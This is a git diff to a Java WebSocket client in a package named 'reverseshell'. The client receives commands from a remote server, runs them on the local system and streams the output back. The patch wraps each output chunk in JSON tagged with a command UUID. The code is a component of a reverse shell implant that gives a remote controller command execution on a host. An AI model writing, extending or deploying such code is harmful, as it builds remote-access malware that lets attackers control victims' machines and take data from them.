@@ -1,5 +1,6 @@
 package com.mtattab.reverseshell.service.impl;
 
+import com.mtattab.reverseshell.model.CommandRestOutput;
 import com.mtattab.reverseshell.model.InitialConnectionMessageModel;
 import com.mtattab.reverseshell.model.ManagerCommunicationModel;
 import com.mtattab.reverseshell.model.ReverseShellInfoInitialMessage;
@@ -42,9 +43,11 @@ public class WebSocketImpl extends WebSocketAdapter {
     private void executeCommandFromServer(ManagerCommunicationModel command){
         if (command != null){
             String commandResponse = SystemCommandProxyUtil.runCommand(command.getMsg());
-            System.out.println(commandResponse.length());
+//            System.out.println(commandResponse.length());
+
             try {
-                sendMessageInPatches(commandResponse,8000);
+
+                sendMessageInPatches(commandResponse,8000, command.getUuid());
 
 
             } catch (IOException e) {
@@ -52,13 +55,19 @@ public class WebSocketImpl extends WebSocketAdapter {
             }
         }
     }
-    private void sendMessageInPatches(String commandResponse , int length ) throws IOException {
+    private void sendMessageInPatches(String commandResponse , int length, String uuid ) throws IOException {
         ArrayList<String> wordsBatch = DataManipulationUtil.splitString(commandResponse,length);
 
         for (String batch : wordsBatch) {
+
             session.getRemote()
                     .sendString(
-                            batch
+                            DataManipulationUtil.convertObjToJson(
+                                    CommandRestOutput.builder()
+                                    .output(batch)
+                                    .uuid(uuid)
+                                    .build()
+                            )
                     );
         }
     }
